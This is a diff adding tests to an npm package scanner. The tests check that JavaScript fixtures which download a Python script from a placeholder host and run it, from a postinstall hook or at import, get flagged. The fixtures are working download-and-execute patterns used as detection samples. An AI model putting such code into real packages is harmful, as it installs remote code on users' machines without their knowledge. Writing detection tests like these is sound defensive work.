@@ -72,6 +72,58 @@ class InstallTimeTests(unittest.TestCase):
                                     "and then runs it.")])
 
 
+class CallbackTests(unittest.TestCase):
+    """D-2 (0.1.9): the download a callback is given (the request client's body, https.get's response, its chunks,
+    piped into a file stream), written to a file and run by an interpreter. A function's summary keeps the files it
+    writes a parameter to, so the write is known when the client gives the callback the download, and a run read
+    before that is matched at the end. Each was missed on the old engine (only `await fetch()` was found)."""
+    HEAD = "const fs = require('fs');\nconst { exec } = require('child_process');\nconst p = '/tmp/x.py';\n"
+    SHAPES = {
+        "request": ("const request = require('request');\n"
+                    "request.get('https://h.invalid/x.py', (e, r, b) => { fs.writeFileSync(p, b); exec('python3 ' + p); });\n"),
+        "chunks": ("const https = require('https');\n"
+                   "https.get('https://h.invalid/x.py', (res) => { let d = '';\n"
+                   "  res.on('data', (c) => { d += c; });\n"
+                   "  res.on('end', () => { fs.writeFileSync(p, d); exec('python3 ' + p); });\n});\n"),
+        "pipe": ("const https = require('https');\n"
+                 "https.get('https://h.invalid/x.py', (res) => { const f = fs.createWriteStream(p); res.pipe(f);\n"
+                 "  f.on('finish', () => exec('python3 ' + p)); });\n"),
+        "helper": ("const https = require('https');\nfunction save(data) { fs.writeFileSync(p, data); }\n"
+                   "https.get('https://h.invalid/x.py', (res) => { let d = '';\n"
+                   "  res.on('data', (c) => { d += c; });\n  res.on('end', () => { save(d); exec('python3 ' + p); });\n});\n"),
+    }
+
+    def test_an_install_script(self):
+        for name, shape in self.SHAPES.items():
+            with self.subTest(name):
+                res = scan_npm({"package.json": json.dumps({"name": "x", "version": "1.0.0",
+                                                            "scripts": {"postinstall": "node setup.js"}}),
+                                "setup.js": self.HEAD + shape})
+                self.assertTrue(any("downloads a script and runs it with Python" in m
+                                    for _, _, m in found(res, "SC-INSTALL-HOOK")), found(res, "SC-INSTALL-HOOK"))
+                self.assertEqual(res["verdict"], "SUSPICIOUS", res["verdictReason"])
+
+    def test_import_time(self):
+        res = scan_npm({"package.json": json.dumps({"name": "x", "version": "1.0.0", "main": "index.js"}),
+                        "index.js": self.HEAD + self.SHAPES["pipe"]})
+        ((file, sev, msg),) = found(res, "SC-IMPORT-RISK")
+        self.assertEqual((file, sev), ("index.js", "CRITICAL"))
+        self.assertIn("downloads a script and runs it with Python", msg)
+
+    def test_a_binary_downloaded_and_run_or_a_download_not_run(self):
+        # what installers of binaries do; a download kept, nothing run: no reason of the trees
+        for text in ("const https = require('https');\nhttps.get('https://h.invalid/tool', (res) => {\n"
+                     "  const f = fs.createWriteStream('/tmp/tool'); res.pipe(f);\n"
+                     "  f.on('finish', () => require('child_process').spawn('/tmp/tool', ['--version'])); });\n",
+                     "const https = require('https');\nhttps.get('https://h.invalid/x.py', (res) => "
+                     "{ res.pipe(fs.createWriteStream(p)); });\n"):
+            with self.subTest(text):
+                res = scan_npm({"package.json": json.dumps({"name": "x", "version": "1.0.0", "main": "index.js"}),
+                                "index.js": self.HEAD + text})
+                self.assertFalse(any("runs it with" in m for _, _, m in found(res, "SC-IMPORT-RISK")),
+                                 found(res, "SC-IMPORT-RISK"))
+
+
 class ImportTimeTests(unittest.TestCase):
     def test_a_batch_file_downloaded_and_run_by_cmd(self):
         init = ("import urllib.request, subprocess\n"
